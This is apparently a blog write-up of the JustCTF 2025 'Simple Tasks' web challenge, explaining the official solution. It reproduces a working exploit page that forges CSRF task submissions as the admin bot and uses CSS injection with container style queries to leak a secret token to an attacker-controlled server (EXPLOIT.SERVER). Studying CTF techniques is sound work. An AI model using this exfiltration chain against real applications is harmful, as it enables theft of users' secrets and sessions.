---
title: JustCTF 2025 Simple Tasks Writeup - Web
date: 2025-08-06
categories: [CTFtime, Web]
tags: [EJS, Express, CSRF, CSS injection, CSP]
---

# Introduction

This challenge features a simple website where you can upload and view tasks as html content.
However the solution isn't as easy, since only one team solved it.
In this post i'll go through the code of the official solution and i'll try to explain how it works.

- link of the challenge: <https://2025.justctf.team/challenges/8>
- official solution: <https://gist.github.com/terjanq/6c9e675595504cb03ec910a9ab96474d>

# My take

The objective is to leak the token from the task uploaded by the admin bot, which will visit any malicious link that we feed him.
After leaking the token we can then use it to get the flag at `/token`

Here's how this is implemented:

```js
app.get('/token', (req, res) => {
    if (adminTokens.has(req.query.token)) {
        res.end(FLAG);
        return;
    }
    res.send('nope');
});

[...]

const visit = async (url) => {
    if (browser) {
        await browser.close();
        await sleep(2000);
        console.log("Terminated ongoing job.");
    }
    try {
        browser = await puppeteer.launch({
            browser: 'chrome',
            headless: true,
            args: ["--disable-features=HttpsFirstBalancedModeAutoEnable", "--no-sandbox"]
        });

        const ctx = await browser.createBrowserContext();
        let page;
        page = await ctx.newPage();

        const token = crypto.randomBytes(24).toString('hex');

        users.set(`admin_${token}`, { password: token, tasks: [{ tasks: [`justToken{${token}}`] }] });
        adminTokens.add(token);

        await page.goto(`http://localhost:3000/login`, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await page.waitForSelector('input[name=username]');
        await page.type('input[name=username]', `admin_${token}`);
        await page.type('input[name=password]', token);
        await page.click('button[type=submit]');
        await sleep(1000);
        await page.close();

        page = await ctx.newPage();
        await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' });

        await sleep(1000 * 60 * 2);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        console.log('close');
        if (browser) await browser.close();
    }
};
```

When i saw the bot i knew the path would be a client-side attack.

There's no CSRF protection so you can upload or view a task as the bot if you send a link that is pointing to your malicious server.

The content of the task is reflected in multiple places, for example it is previewed in the `/tasks` page,
but here not only it is HTML escaped by ejs,
there's also a strict CSP in place that prevents XSS and CSS injection:

```js
app.use((req, res, next) => {
    const nonce = res.locals.nonce = crypto.randomBytes(16).toString('base64');
    res.setHeader("Content-Security-Policy", `script-src 'nonce-${nonce}'; style-src 'nonce-${nonce}'`);
    res.setHeader("Cache-Control", "no-store");

    next();
});
```

Only when you click the preview button the policy is overwritten, content rendered as html and css is allowed:

```js
app.get('/tasks/preview/:id/:pos', requireLogin, (req, res) => {
    res.set("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Content-Security-Policy", `script-src 'none'`);

    const user = users.get(req.session.username);
    const taskId = parseInt(req.params.id);
    const taskPos = parseInt(req.params.pos);

    const task = user.tasks[taskId];
    if (task && task.tasks[taskPos] != null) {
        res.end(task.tasks[taskPos]);
        return;
    }

    res.end("Task not found");
});
```

So i thought i could use css injection to leak the token... But how am i supposed to do it
if the token is in a page different from the injection point? I thought about using a same origin
iframe and changing its style, but i think it's possible only with javascript.

At this point i was completely lost, so i waited to see the solution and it turned out to be really clever!

# The solution

Basically we want to include the `/tasks` page as css stylesheet and use css to leak the token.

Here's the page that the bot should visit:
```html
<form target="chall" id="form" method="POST">
  <textarea name="content"></textarea>
</form>
<script>
  const sleep = d => new Promise(r=>setTimeout(r,d));

  const CHALL_URL = 'http://127.0.0.1:80';
  const containerTpl = flag => `,\n${flag}</pre>\n        </td>\n      </tr>\n      \n  </table>\n\n  <form method=\"POST\" action=\"/tasks/create\">\n    <button class=\"btn\" type=\"submit\">Create New Task</button>\n  </form>\n\n</body>\n\n</html>`;

  const form = document.querySelector('#form');
  form.action = `${CHALL_URL}/tasks/0`;
  let flag = 'justToken{';

  window.onload = async () => {
    for(let i=0; i<50; i++){
      const prev = `<link rel=stylesheet href=/tasks><link rel=stylesheet href=${window.origin}/css/${flag}>}`;
      const task = `${prev}${'a'.repeat(500 - flag.length - 12 - prev.length)}{}*{--x:`;
      form.content.value = task;
      form.submit();
      await sleep(1000);
      open(`${CHALL_URL}/tasks/preview/0/0`, 'prev');
      flag = await fetch('/poll').then(e=>e.text());
      console.log(flag);
      open(`${CHALL_URL}/tasks/delete/0/0`, 'prev');
      await sleep(1000);
    }
    
  }

</script>
```

Here we are submitting a form as the bot, this will trigger a POST request with the session cookie of the bot
that will let us save a new arbitrary task.

The payload of the task is where the magic happens, it will look something like this:

```html
<link rel=stylesheet href=/tasks><link rel=stylesheet href=http://EXPLOIT.SERVER/css/justToken{KNOWN>}[PADDING]aaa{}*{--x:
```

First the tasks page is included as a stylesheet, here our tasks are previewed as follow by ejs:
```html
<pre><% const preview=task.tasks.join(",\n"); %><%= preview.length>500? preview.slice(0, 500) + "..." : preview %></pre>
```

there are two important details essential for the exploitation:

- each task is joined and if the content length is more than 500 characters it is truncated.
- our payload will be rendered first, because each new task is prepended using `task.tasks.unshift(content);`.

With the padding, only the first two unknwon characters of the flag will be rendered in the task page:

```js
'a'.repeat(500 - flag.length - 12 - prev.length)
```

here the magic number -12 is the size of `{}*{--x:` + `,\n` for the join + 2 which are the unknwon characters of the token that the exploit will
try to guess each time.

The second stylesheet is used to load another dynamic part of the payload, which will be used to guess new characters of the token using a 
[container style query](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_containment/Container_size_and_style_queries#container_style_queries)
that will apply a style only if the `--x` css variable matches the `--y` variable.

The final imported css code after all the imports will look something like this:
```css
* {--y0_0:,\njustToken{00...[BOTTOM OF THE PAGE]
* {--y0_1:,\njustToken{01...[BOTTOM OF THE PAGE]
[...]
* {--y0:,\njustToken{0...[BOTTOM OF THE PAGE]
* {--y1:,\njustToken{1...[BOTTOM OF THE PAGE]

@container style(--x:var(--y0_0)){
  body{
    background: red url('/leak/justToken{00');
  }
}
@container style(--x:var(--y0_1)){
  body{
    background: red url('/leak/justToken{01');
  }
}
[...]
@container style(--x:var(--y0)){
  body{
    background: red url('/leak/justToken{0');
  }
}
@container style(--x:var(--y1)){
  body{
    background: red url('/leak/justToken{1');
  }
}
```

Here we are first trying to guess two characters, then only one character using some broken
 [custom properties](https://developer.mozilla.org/en-US/docs/Web/CSS/--*) that are missing the
semicolon and the closing bracket of the block.

The css parser by default doesn't raise an exception when it encounters invalid code, instead
it will ignore the code that raise the exceptions. You can read more about css exception handling here:

<https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_syntax/Error_handling>

This property of the parser helps us understand the subtle details of the exploit...
Here's how i think they work:

- the previous open blocks are automatically closed
- custom variable in general are always valid when declared
- the closing bracket after the second import is used to close the opening of the `justToken{KNOWN` so the previous invalid selectors and the block are discarded instead of the entire line
- the closed block after the padding is used for the same reason
- we leave a curly brace open after `--x` so the token but also all the rest of the page is included in the variable

Now, why are we checking for two characters and for one character at the same time? I'm not sure to be honest.
I think the exploit works even if we check only for one character at a time, but it may be too slow for the bot.

I think we check only for one character to include the edge case of the token length being odd, but if this is the
case the `}` will be included in the `/tasks` and i think our leaked flag won't include the bottom of the page
so it shouldn't match and we will miss the last character.

I should say the exploit stops at the first iteration on my end for some reason, so i didn't really test it and i'm too lazy to write my own... Oops!

Anyway, at each iteration a new piece of the flag is saved, the exploit task is deleted so we can prepend another one and loops continues for 50 times .

# Conclusion

"Simple" was only in the title of the challenge, the exploit is clever and complex, with a lot of details that can be overlooked.













